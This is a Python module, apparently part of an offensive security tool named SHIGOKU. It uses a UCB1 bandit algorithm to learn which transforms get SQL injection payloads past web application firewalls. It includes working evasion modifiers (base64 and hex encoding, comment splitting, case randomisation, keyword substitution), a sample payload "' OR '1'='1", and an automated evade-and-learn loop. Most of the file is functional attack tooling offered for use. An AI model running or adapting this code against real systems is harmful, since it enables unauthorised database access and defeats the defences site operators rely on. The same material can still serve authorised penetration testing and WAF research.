"""
UCB1-based WAF Evasion Strategy for SHIGOKU Phase D
Elegant multi-armed bandit approach with Laplace smoothing
"""
from __future__ import annotations
import math
import random
import logging
from typing import List, Dict, Any, Optional
from dataclasses import dataclass, field
from abc import ABC, abstractmethod

logger = logging.getLogger(__name__)


@dataclass
class EvasionStrategy:
    """Individual WAF evasion strategy"""
    name: str
    description: str
    modifier: callable  # Function to modify payload
    
    # UCB1 statistics (initialized with Laplace smoothing)
    trials: int = field(default=1)  # Laplace smoothing: start at 1
    successes: int = field(default=1)  # Optimistic initialization
    
    @property
    def success_rate(self) -> float:
        """Current success rate (0.0-1.0)"""
        return self.successes / self.trials
    
    def apply(self, payload: str) -> str:
        """Apply evasion modifier to payload"""
        return self.modifier(payload)


@dataclass  
class EvasionResult:
    """Result of evasion attempt"""
    success: bool
    strategy_used: str
    original_payload: str
    modified_payload: str
    response_status: int
    timestamp: float


class WAFEvasionModifier(ABC):
    """Abstract base class for WAF evasion modifiers"""
    
    @abstractmethod
    def modify(self, payload: str) -> str:
        """Modify payload to evade WAF"""
        pass


class UCB1WAFEvasion:
    """
    UCB1 (Upper Confidence Bound) based WAF evasion strategy selector
    
    Features:
    - Laplace smoothing for initialization (prevents division by zero)
    - Optimistic initialization (promotes exploration)
    - Balances exploration vs exploitation
    
    Note: Deep RL is deferred to Ver.2. UCB1 provides sufficient
    performance with much simpler implementation.
    """
    
    EXPLORATION_CONSTANT = 2.0  # Standard UCB1 constant
    
    def __init__(self, strategies: Optional[List[EvasionStrategy]] = None):
        self.strategies: List[EvasionStrategy] = strategies or []
        self._initialize_with_laplace_smoothing()
    
    def _initialize_with_laplace_smoothing(self):
        """
        Initialize strategies with Laplace smoothing
        
        - trials=1: Prevents division by zero
        - successes=1: Optimistic initialization promotes exploration
        - success_rate=1.0: Unseen strategies get highest priority initially
        """
        for strategy in self.strategies:
            strategy.trials = 1
            strategy.successes = 1
        logger.debug(f"Initialized {len(self.strategies)} strategies with Laplace smoothing")
    
    def add_strategy(
        self, 
        name: str, 
        description: str, 
        modifier: callable
    ) -> UCB1WAFEvasion:
        """Add a new evasion strategy (fluent interface)"""
        strategy = EvasionStrategy(
            name=name,
            description=description,
            modifier=modifier
        )
        # Apply Laplace smoothing to new strategy
        strategy.trials = 1
        strategy.successes = 1
        
        self.strategies.append(strategy)
        logger.debug(f"Added strategy: {name}")
        return self
    
    def select_strategy(
        self, 
        context: Optional[Dict[str, Any]] = None
    ) -> EvasionStrategy:
        """
        Select strategy using UCB1 algorithm
        
        UCB1 formula: success_rate + sqrt(2 * ln(total_trials) / trials)
        
        This balances:
        - Exploitation: Strategies with high success rate
        - Exploration: Strategies with few trials
        """
        if not self.strategies:
            raise ValueError("No strategies available")
        
        total_trials = sum(s.trials for s in self.strategies)
        
        if total_trials == 0:
            # Fallback to random selection
            return random.choice(self.strategies)
        
        # Calculate UCB1 scores
        def ucb1_score(strategy: EvasionStrategy) -> float:
            exploitation = strategy.success_rate
            exploration = math.sqrt(
                self.EXPLORATION_CONSTANT * math.log(total_trials) / strategy.trials
            )
            return exploitation + exploration
        
        # Select strategy with highest UCB1 score
        best_strategy = max(self.strategies, key=ucb1_score)
        
        logger.debug(
            f"Selected strategy: {best_strategy.name} "
            f"(rate={best_strategy.success_rate:.3f}, trials={best_strategy.trials})"
        )
        
        return best_strategy
    
    def update_result(self, strategy_name: str, success: bool):
        """
        Update strategy statistics after attempt
        
        Call this after each evasion attempt to improve future selections
        """
        strategy = next(
            (s for s in self.strategies if s.name == strategy_name),
            None
        )
        
        if strategy is None:
            logger.warning(f"Unknown strategy: {strategy_name}")
            return
        
        strategy.trials += 1
        if success:
            strategy.successes += 1
        
        logger.debug(
            f"Updated {strategy_name}: trials={strategy.trials}, "
            f"successes={strategy.successes}, rate={strategy.success_rate:.3f}"
        )
    
    def get_statistics(self) -> Dict[str, Dict[str, Any]]:
        """Get current statistics for all strategies"""
        return {
            s.name: {
                "trials": s.trials,
                "successes": s.successes,
                "success_rate": s.success_rate,
                "description": s.description
            }
            for s in self.strategies
        }
    
    def evade(
        self, 
        payload: str,
        test_callback: callable
    ) -> EvasionResult:
        """
        Attempt WAF evasion with automatic strategy selection
        
        Args:
            payload: Original SQLi payload
            test_callback: Function to test payload (returns success bool)
        
        Returns:
            EvasionResult with selected strategy and outcome
        """
        import time
        
        # Select strategy
        strategy = self.select_strategy()
        
        # Apply evasion
        modified = strategy.apply(payload)
        
        # Test
        success, status = test_callback(modified)
        
        # Update statistics
        self.update_result(strategy.name, success)
        
        return EvasionResult(
            success=success,
            strategy_used=strategy.name,
            original_payload=payload,
            modified_payload=modified,
            response_status=status,
            timestamp=time.time()
        )


# Pre-defined evasion strategies

def create_default_strategies() -> List[EvasionStrategy]:
    """Create default set of WAF evasion strategies"""
    
    strategies = [
        EvasionStrategy(
            name="base64_encoded",
            description="Base64 encode the payload",
            modifier=lambda p: f"CAST(FROM_BASE64('{_b64(p)}') AS CHAR)",
        ),
        EvasionStrategy(
            name="hex_encoded",
            description="Hex encode the payload",
            modifier=lambda p: f"0x{p.encode().hex()}",
        ),
        EvasionStrategy(
            name="unicode_encoded",
            description="Unicode escape sequences",
            modifier=lambda p: p.replace("'", "\\'").replace('"', '\\"'),
        ),
        EvasionStrategy(
            name="comment_obfuscation",
            description="Insert SQL comments between keywords",
            modifier=lambda p: p.replace(" ", "/**/"),
        ),
        EvasionStrategy(
            name="case_randomization",
            description="Randomize case of SQL keywords",
            modifier=_randomize_case,
        ),
        EvasionStrategy(
            name="keyword_substitution",
            description="Substitute keywords with equivalents",
            modifier=lambda p: p.replace("OR", "||").replace("AND", "&&"),
        ),
    ]
    
    return strategies


def _b64(s: str) -> str:
    """Base64 encode helper"""
    import base64
    return base64.b64encode(s.encode()).decode()


def _randomize_case(payload: str) -> str:
    """Randomize case of SQL keywords"""
    import re
    
    keywords = ['SELECT', 'FROM', 'WHERE', 'AND', 'OR', 'UNION', 'INSERT', 'DELETE']
    result = payload
    
    for kw in keywords:
        # Find all occurrences (case insensitive)
        pattern = re.compile(re.escape(kw), re.IGNORECASE)
        
        def random_case(match):
            word = match.group()
            return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in word)
        
        result = pattern.sub(random_case, result)
    
    return result


# Convenience function for simple use
def create_ucb1_evasion() -> UCB1WAFEvasion:
    """
    Create UCB1 WAF evasion with default strategies
    
    Usage:
        evasion = create_ucb1_evasion()
        result = evasion.evade("' OR '1'='1", test_payload)
    """
    strategies = create_default_strategies()
    return UCB1WAFEvasion(strategies)


# Global instance
_ucb1_evasion: Optional[UCB1WAFEvasion] = None


def get_ucb1_evasion() -> UCB1WAFEvasion:
    """Get or create global UCB1 evasion instance"""
    global _ucb1_evasion
    if _ucb1_evasion is None:
        _ucb1_evasion = create_ucb1_evasion()
    return _ucb1_evasion
